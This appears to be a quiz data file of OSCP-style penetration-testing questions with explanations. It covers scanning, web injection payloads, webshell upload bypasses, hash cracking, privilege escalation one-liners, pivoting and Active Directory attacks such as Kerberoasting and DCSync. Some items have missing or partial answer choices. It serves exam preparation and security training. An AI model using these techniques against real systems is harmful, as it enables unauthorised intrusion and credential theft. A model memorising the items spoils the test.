questions.q: You have a target IP and want a fast full TCP port sweep before deep enumeration. What nmap invocation identifies all open ports quickly?
questions.why: -p- scans all 65535 TCP ports; --min-rate and -T4 speed it up. -sn is host discovery only and -sU is UDP.

questions.q: After finding open ports, you want service versions and default scripts against just those ports. What is the correct follow-up nmap command?
questions.why: -sV grabs version banners and -sC runs default NSE scripts, targeted at the ports found earlier.

questions.q: An nmap scan shows port 445 open. Which tool best enumerates SMB shares and null-session access on a Linux attack box?
questions.why: smbclient -L lists shares; -N attempts a null (no password) session, a classic SMB enumeration step.

questions.q: You need to enumerate exported NFS mounts on a target showing port 2049 open. Which command lists them?
questions.why: showmount -e queries the NFS mountd service to list exported directories, revealing potential mountable shares.

questions.q: A web server hosts an unknown application. What is the best first step to discover hidden directories and files?
choices: Run gobuster or feroxbuster with a directory wordlist
Launch a full nmap UDP scan
questions.why: Content discovery tools like gobuster/feroxbuster brute force paths from a wordlist to map hidden endpoints.

questions.q: gobuster returns only 403 and 200 on a wildcard host. What flag helps you brute force by virtual host name instead of paths?
questions.why: gobuster vhost mode fuzzes the Host header to discover name-based virtual hosts on the same IP.

questions.q: A page loads content via ?page=about. You suspect Local File Inclusion. Which input best confirms LFI on a Linux target?
questions.why: Directory traversal to /etc/passwd is the classic LFI confirmation; readable system files prove file inclusion.

questions.q: You confirmed LFI and the target allows remote URLs in include(). What does this upgrade the vulnerability to?
choices: Remote File Inclusion (RFI) enabling remote code execution
questions.why: When allow_url_include is on, an attacker-hosted file can be included and executed, turning LFI into RFI/RCE.

questions.q: A login form errors differently for valid vs invalid usernames and reflects input into SQL. To confirm SQL injection manually, which payload is most diagnostic?
questions.why: A tautology like ' OR 1=1-- - alters query logic; a changed response confirms the input reaches SQL unsanitized.

questions.q: You have a GET parameter vulnerable to SQL injection and want to dump the database automatically. Which tool and flag list current databases?
questions.why: sqlmap --dbs enumerates available databases once injection is confirmed, the standard first extraction step.

questions.q: A file upload form accepts images. You want a PHP webshell but .php is blocked. Which technique commonly bypasses naive extension filters?
choices: Encode the payload in base64 in the filename
Upload as shell.phtml or shell.php.jpg depending on server parsing
questions.why: Alternate PHP extensions like .phtml, or double extensions, can slip past blacklist filters if the server still executes them.

questions.q: You captured NTLMv2 hashes with Responder. Which hashcat mode cracks NetNTLMv2 hashes?
questions.why: Mode 5600 is NetNTLMv2. 1000 is NTLM, 0 is raw MD5, and 1800 is sha512crypt.

questions.q: You dumped a Windows local hash and want to crack the NT portion. Which hashcat mode corresponds to a raw NTLM hash?
questions.why: Mode 1000 is NTLM. 5600 is NetNTLMv2, 3200 is bcrypt, 500 is md5crypt.

questions.q: You have a valid username and want to brute force SSH with a password list. Which hydra command is correct?
questions.why: -l sets a single login, -P a password list, and ssh://<ip> the service. Uppercase -L would be a user list.

questions.q: A Linux /etc/shadow line uses $6$ prefix. Which hashcat mode cracks it?
questions.why: $6$ denotes sha512crypt, which is hashcat mode 1800. $1$ would be md5crypt (500) and $5$ sha256crypt (7400).

questions.q: You want to generate a custom wordlist from words on a target company website. Which tool is designed for this?
questions.why: cewl spiders a URL and builds a wordlist from page content; crunch generates by pattern and cupp profiles a person.

questions.q: After landing a low-priv Linux shell, which single command best surfaces SUID binaries for privilege escalation?
questions.why: find with -perm -4000 locates files with the SUID bit set, prime candidates for escalation via GTFOBins.

questions.q: sudo -l shows you may run /usr/bin/find as root without a password. What is the standard escalation approach?
choices: Use find's -exec to spawn a root shell (per GTFOBins)
questions.why: find . -exec /bin/sh \; runs a shell with root privileges since sudo grants root; GTFOBins documents this.

questions.q: You find a world-writable script referenced by a root cron job running every minute. What is the escalation path?
choices: Delete the cron file to gain root
Edit the script to add a reverse shell or copy /bin/bash with SUID
questions.why: A root-executed writable script lets you inject commands that run as root on the next scheduled tick.

questions.q: An enumeration script flags the kernel as very old and unpatched. Before running a kernel exploit, what is the safest OSCP practice?
choices: Reboot the machine to load a new kernel
Exhaust misconfiguration vectors first; kernel exploits can crash the box
Immediately run the first exploit-db result
questions.why: Kernel exploits are unstable and may panic the target; enumerate sudo, SUID, cron, and services first.

questions.q: A SUID binary calls system("service ...") without an absolute path. Which technique exploits this?
choices: PATH hijacking: create a malicious 'service' earlier in PATH
questions.why: A relative command call lets you prepend a writable directory to PATH so your fake binary runs as root.

questions.q: You want an automated Linux privilege escalation enumeration script commonly used in OSCP labs. Which is it?
questions.why: linpeas.sh enumerates Linux privesc vectors. winPEAS, PowerUp, and Seatbelt are Windows tools.

questions.q: On a Linux target you find a capability set with getcap. Which capability on a binary most directly leads to root?
choices: cap_setuid+ep on an interpreter like python
questions.why: cap_setuid lets a program set its UID to 0; on python you can call os.setuid(0) then spawn a root shell.

questions.q: On Windows you have a low-priv shell. Which command lists services whose executable path is unquoted and contains spaces?
choices: wmic service get name,pathname,startmode | findstr /i "auto" then inspect quotes
questions.why: Enumerating service pathnames reveals unquoted paths with spaces, exploitable if a parent directory is writable.

questions.q: You found an unquoted service path C:\Program Files\My App\svc.exe writable at C:\. Where do you place your payload?
questions.why: Windows tries C:\Program.exe first when the path is unquoted with spaces, running your payload as the service account.

questions.q: A service runs as SYSTEM and you have write access to its binary (BINARY_PATH_NAME). What is the escalation?
choices: Replace or reconfigure the binary and restart the service to run your payload as SYSTEM
questions.why: Weak service permissions let you swap the executable or use sc config binPath, then restart for SYSTEM execution.

questions.q: whoami /priv shows SeImpersonatePrivilege enabled on a service account. Which class of exploit does this enable?
choices: DLL search order hijacking of explorer
Potato attacks (JuicyPotato, PrintSpoofer) to escalate to SYSTEM
questions.why: SeImpersonate lets potato-family tools impersonate SYSTEM tokens via named pipe/COM tricks to escalate.

questions.q: You want to run automated Windows privilege escalation checks in a modern .NET aware way. Which pair are appropriate tools?
questions.why: winPEAS and PowerUp both enumerate Windows privesc vectors like services, DLLs, and unquoted paths.

questions.q: You have a foothold on a host that can reach an internal 10.10.x subnet you cannot. You have SSH access to the foothold. Which sets up a SOCKS proxy for tools?
questions.why: -D creates a dynamic SOCKS proxy on 1080; proxychains routes tool traffic through the pivot into the internal net.

questions.q: You want to reach a single internal service (10.5.5.5:3306) from your attack box through an SSH pivot. Which forward is correct?
questions.why: Local port forward -L binds a local port and tunnels it to the remote host:port through the pivot.

questions.q: The compromised host cannot run an SSH server but you have a shell. Which tool creates a fast reverse SOCKS tunnel commonly used in OSCP?
choices: chisel (server on attacker, client reverse on target)
questions.why: chisel builds an encrypted tunnel over HTTP; a reverse SOCKS client on the target gives you pivot access.

questions.q: You configured a SOCKS proxy on 127.0.0.1:1080. What must you edit so nmap and other tools route through it?
choices: Change the default route with ip route add
Add 'socks5 127.0.0.1 1080' to /etc/proxychains.conf and prefix commands with proxychains
questions.why: proxychains reads its config for the SOCKS entry; prefixing a command forces its TCP connections through the proxy.

questions.q: Through proxychains, which nmap options are required because SOCKS proxies only handle full TCP connections?
questions.why: SOCKS cannot carry raw SYN packets, so -sT connect scan is required; -Pn skips ICMP discovery the proxy blocks.

questions.q: In an Active Directory environment, a service account has a SPN set. Which attack requests and cracks its Kerberos ticket offline?
questions.why: Kerberoasting requests TGS tickets for SPN accounts; the RC4 ticket is crackable offline to recover the password.

questions.q: You have valid domain credentials and want to request Kerberoastable hashes from a Linux box. Which Impacket tool does this?
questions.why: GetUserSPNs.py queries for SPN accounts and outputs crackable TGS hashes. GetNPUsers is for AS-REP roasting.

questions.q: A domain user account has 'Do not require Kerberos preauthentication' set. Which attack retrieves a crackable hash without any password?
questions.why: Without preauth, the KDC returns an AS-REP encrypted with the user's key, crackable offline. GetNPUsers automates it.

questions.q: You recovered an NTLM hash for a local admin and want to authenticate to another host without cracking it. Which technique applies?
questions.why: NTLM authentication accepts the hash directly; pass-the-hash reuses it for lateral movement without the plaintext.

questions.q: You want to map AD attack paths (who can reach Domain Admins). Which collector feeds data into BloodHound?
questions.why: SharpHound gathers AD objects, sessions, and ACLs into JSON that BloodHound ingests to graph attack paths.

questions.q: With domain admin or equivalent replication rights, which Impacket action extracts all domain hashes from a DC?
questions.why: secretsdump.py uses the DRSUAPI (DCSync) to pull the NTDS.dit hashes, including krbtgt, from the domain controller.

questions.q: You have a list of usernames and want to validate which exist in a domain and spray a password over Kerberos. Which tool is purpose-built?
questions.why: kerbrute performs fast username enumeration and password spraying via Kerberos pre-auth without locking as noisily.

questions.q: You want to execute commands on a Windows host over SMB using recovered credentials or a hash. Which Impacket script is standard?
questions.why: psexec.py and wmiexec.py give command execution over SMB/WMI with a password or NTLM hash for lateral movement.

questions.q: You are developing a classic 32-bit Windows stack buffer overflow. After finding the crash, what is the correct next step to control EIP?
choices: Fuzz UDP with random bytes forever
Overwrite the SEH chain without checking
Immediately send shellcode of random length
Send a cyclic pattern and use pattern_offset to find the exact EIP offset
questions.why: A unique cyclic pattern (msf-pattern) reveals the exact offset where the return address is overwritten.

questions.q: In a stack overflow you control EIP and have space for shellcode. Which instruction do you typically overwrite EIP with to reach your payload on the stack?
choices: The address of a JMP ESP instruction
questions.why: JMP ESP redirects execution to ESP, which points at your shellcode; find one in a non-ASLR module with mona.

questions.q: Before placing shellcode you must identify bad characters. What is the standard method in the OSCP overflow workflow?
choices: Send all byte values 0x01-0xff and compare stack memory to spot corrupted bytes
Encode with shikata_ga_nai and skip testing
Assume only 0x00 is bad and continue
questions.why: Sending the full bytearray and diffing what lands in memory reveals which characters the app mangles or truncates.

questions.q: You must generate Windows reverse shellcode for the overflow while excluding the null byte. Which msfvenom option specifies bad chars?
questions.why: The -b flag tells msfvenom which bytes to avoid so the encoder produces payloads without those characters.

questions.q: You have a limited non-interactive shell on Linux and want a fully interactive TTY. Which upgrade sequence is standard?
choices: python3 -c 'import pty;pty.spawn("/bin/bash")' then set stty raw and export TERM
questions.why: pty.spawn upgrades to a pseudo-terminal; combined with stty raw -echo and fg you get a fully interactive shell.

questions.q: SNMP is open on UDP 161 with a default community string. Which tool and community best enumerate system info?
questions.why: snmpwalk with community 'public' dumps the MIB tree, often exposing processes, users, and network details.

questions.q: A DNS server on the target may allow zone transfers. Which command attempts to pull all records for a domain?
questions.why: dig axfr requests a full zone transfer; misconfigured servers hand over every record, mapping the internal namespace.

questions.q: You obtained a shell and need to transfer a Linux enum script to a target with curl available. Which host-side and target-side pairing works?
choices: nc -lvnp with no listener on either side
scp from target with no credentials
python3 -m http.server on attacker, then curl http://attacker:8000/linpeas.sh on target
ftp anonymous upload to the target automatically
questions.why: A simple HTTP server plus curl/wget is the reliable OSCP file-transfer method when no SMB or SSH is available.

questions.q: On a Windows target without curl, which built-in method downloads a file from your attacker HTTP server?
questions.why: certutil is a signed Windows binary that can fetch files over HTTP, a common living-off-the-land transfer.

questions.q: You want a PowerShell one-liner reverse shell but the box blocks obvious downloads. Which native cmdlet fetches and runs remote script content in memory?
choices: Set-ExecutionPolicy Bypass alone gives a shell
questions.why: Invoke-Expression with DownloadString runs a remote script in memory without touching disk, common in AD footholds.

questions.q: A web app runs as a service and you gained RCE. Before privilege escalation, what is the most important OSCP habit for exam scoring?
choices: Grab the local.txt/proof, then take screenshots and note the exact commands used
questions.why: The exam scores documented proof; capturing flags with screenshots and reproducible commands is essential for reporting.

questions.q: When writing the OSCP exam report, which element is required for each compromised host to demonstrate a repeatable exploit?
choices: Step-by-step commands, screenshots, and the proof.txt/local.txt contents
Only the final flag value with no steps
A list of every tool installed on Kali
questions.why: Graders must reproduce the compromise; each host needs the exact methodology, evidence screenshots, and proof files.

questions.q: You cracked a hash but the plaintext fails on the service. Which OSCP mindset step should you take before assuming the hash is wrong?
choices: Assume the exam is broken and stop
Reuse the credential across other services and hosts (password reuse) and verify the correct user
questions.why: Credential reuse across services and accounts is a core methodology; the plaintext may authenticate elsewhere.

questions.q: You have write access to a PATH-writable directory and a root cron runs 'tar' with a wildcard on files you control. Which technique abuses this?
choices: Wildcard injection using tar --checkpoint-action to execute a script
questions.why: Crafted filenames like --checkpoint-action=exec are parsed as tar options, running your command as the cron's user.
